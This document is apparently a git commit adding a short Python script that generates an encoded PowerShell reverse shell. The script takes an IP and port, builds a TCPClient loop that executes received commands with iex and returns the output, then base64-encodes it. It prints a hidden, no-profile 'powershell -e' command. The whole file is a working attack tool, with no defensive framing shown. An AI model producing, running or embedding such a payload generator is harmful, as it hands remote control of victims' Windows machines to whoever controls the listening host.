d6165d1d8331dd84fc830e917500862b2a101123
SezioS <118485549+sergiovks@users.noreply.github.com>
2023-05-30 12:07:39 +0200

    Create encodedPWSpayloadGenerator.py

---
+++ encodedPWSpayloadGenerator.py
@@ -0,0 +1,20 @@
+import sys
+import base64
+import argparse
+
+# Parse the command-line arguments
+parser = argparse.ArgumentParser(description='Script to generate PowerShell command with IP and port.')
+parser.add_argument('-i', '--ip', help='IP address', required=True)
+parser.add_argument('-p', '--port', help='Port number', required=True)
+args = parser.parse_args()
+
+# Generate the payload with user-provided IP and port
+payload = f'$client = New-Object System.Net.Sockets.TCPClient("{args.ip}", {args.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
+
+# Encode the payload
+encoded_payload = base64.b64encode(payload.encode('utf16')[2:]).decode()
+
+# Generate the final command
+cmd = f'powershell -nop -w hidden -e {encoded_payload}'
+
+print(cmd)
